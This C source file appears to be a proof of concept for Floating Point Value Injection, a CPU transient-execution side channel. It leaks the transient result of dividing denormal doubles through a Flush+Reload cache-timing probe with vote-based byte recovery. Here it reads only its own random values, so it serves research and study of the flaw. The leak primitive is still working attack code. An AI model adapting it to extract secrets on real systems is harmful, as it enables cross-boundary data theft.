#include <stdio.h>
#include <unistd.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/time.h>


static inline __attribute__((always_inline)) void lfence() {
	asm volatile ("lfence\n");
}

static inline __attribute__((always_inline)) void clflush(void* p) {
	asm volatile("clflush (%0)\n"::"r"(p));
}

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
	uint64_t lo, hi;
	asm volatile("rdtsc\n" : "=a" (lo), "=d" (hi) :: "rcx");
	return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
	uint64_t lo, hi;
	asm volatile("rdtscp\n" : "=a" (lo), "=d" (hi) :: "rcx");
	return (hi << 32) | lo;
}

void flush_all(char *buff, int stride){
	for (size_t k = 0; k < 256; ++k) {
		// size_t x = ((k * 167) + 13) & (0xff);
        clflush(buff + (k*stride));
    }
}

static __always_inline uint64_t get_random_bits(){
    uint64_t out;
    asm volatile("rdrand %%rax\n":"=a"(out)::"cc");
    return out;
}

static __always_inline double make_denormal(uint64_t bits){
    uint64_t mask = (1ull << 52) -1;
    uint64_t masked = bits & mask;
    if (masked == 0) masked += 1;
    double denormal = 0.0;
    memcpy(&denormal, &masked, sizeof(denormal));
    return denormal;
}

static __always_inline void fpvi(double *denormalX, double *denormalY, unsigned char *buff, uint8_t leak_offset){
    asm volatile(      
        // Repeat the leak a few times
        "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div
        "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div
        "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div
        "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div
        "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div

        // Leak Transient result byte
        "movq %%xmm0,%%rax\nshr %%cl, %%rax\n"

        "andq $0xff, %%rax\n"       // Mask out everything but the 1st byte
        "shlq $12, %%rax\n"         // Multiply by 4096 (page size)
        "movq (%2, %%rax), %%rax\n" // Touch timing_buff_0
        ::"r"(denormalX), "r"(denormalY), "r"(buff), "c"(leak_offset*8):"rax","xmm0","xmm1"
    );
}

void probe_buffer(int stride, int cutoff, unsigned char *buff, int votes[256]){
    unsigned char *test_src;
    volatile register unsigned char test_dest;

    for (size_t k = 0; k < 256; ++k) {
        size_t x = ((k * 167) + 13) & (0xff);
        test_src = buff + (stride * x);
        
        uint64_t t1s = rdtscp();  // Start Timer
        test_dest = *test_src; // Read char from location
        lfence(); // Wait until all loads are completed
        uint64_t diff = rdtscp() - t1s; // End Timer
        if (diff < cutoff && x!=0) {
            votes[x]+=1;
        }
    }
}


// --- Constants for Optimization ---
#define MAX_REPETITIONS 1000  // Increased max, but we exit early
#define CHECK_INTERVAL 5     // Check for success every N reps
#define MIN_VOTES 5           // Minimum votes required to consider a winner
#define WIN_MARGIN 2          // Winner must have 2x the votes of the runner-up


// Returns the index of the winner, or -1 if no clear winner yet
int check_winner(int votes[256]) {
    int max_v = -1;
    int max_i = -1;
    int runner_up_v = -1;

    for (int i = 0; i < 256; i++) {
        if (votes[i] > max_v) {
            runner_up_v = max_v;
            max_v = votes[i];
            max_i = i;
        } else if (votes[i] > runner_up_v) {
            runner_up_v = votes[i];
        }
    }

    // Heuristics for early exit
    if (max_v >= MIN_VOTES) {
        if (runner_up_v == 0 || (max_v / (runner_up_v + 1) >= WIN_MARGIN)) {
            return max_i;
        }
    }
    return -1;
}

unsigned char interpret_votes(int votes[256]){
    unsigned char most_votes = 0;
    int max_v = 0;
    for (int i=0; i<256; i++) {
        if (votes[i] > max_v) {
            max_v = votes[i];
            most_votes = i;
        }
    }
    return most_votes;
}


char collect_value(uint8_t index, int stride, int cutoff, double denormalX, double denormalY, unsigned char *buff){
    int votes_0[256] = {0};

    int finalized = -1;

    for (int r=0;r<MAX_REPETITIONS;r++){
        flush_all(buff, stride);

        fpvi(&denormalX, &denormalY, buff, index);

        asm volatile("mfence\n");
        // One round of timing checks
        probe_buffer(stride, cutoff, buff, votes_0);

        // Only check every few rounds to save CPU cycles on the check logic itself
        if (r > 10 && r % CHECK_INTERVAL == 0) {
            if (finalized == -1) finalized = check_winner(votes_0);

            if (finalized != -1) {
                break;
            }
        }
    }

    return (finalized != -1) ? finalized : interpret_votes(votes_0);
}

#define STRIDE 4096
#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB)

#define REGION_START 8*4
#define REGION_LEN 4

uint64_t GetTimeStamp() {
    struct timeval tv;
    gettimeofday(&tv,NULL);
    return tv.tv_sec*(uint64_t)1000000+tv.tv_usec;
}

int main(){
    unsigned char leaked[sizeof(double)] = {0};
    unsigned char *timing_buff = (unsigned char *)mmap(NULL, 2*4096*256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);

    if (timing_buff == MAP_FAILED) {
        perror("[#] Failed to map reload buffer");
        return 1;
    } else {
        timing_buff += 0x80;
    }

    double denormalX = make_denormal(get_random_bits());
    uint64_t checkX; memcpy(&checkX, &denormalX, sizeof(checkX));
    double denormalY = make_denormal(get_random_bits());
    uint64_t checkY; memcpy(&checkY, &denormalY, sizeof(checkX));

    printf("[=] Leaking Denormed X/Y:\n");
    printf(" |- Denormed X: %a (%016" PRIx64 ")\n |- Denormed Y: %a (%016" PRIx64 ")\n", denormalX,checkX, denormalY,checkY);

    uint64_t s0 = GetTimeStamp();
    for (uint8_t index=0;index<sizeof(double);index++) {
        leaked[index] = collect_value(index, STRIDE, 160, denormalX, denormalY, timing_buff);
    }
    uint64_t sp = GetTimeStamp();

    printf("[#] Got: ");
    for (int i=0;i<sizeof(double);i++) printf("%02x", leaked[i]);
    printf("\n |- Took %ld us\n", sp - s0);
    
    return 0;
}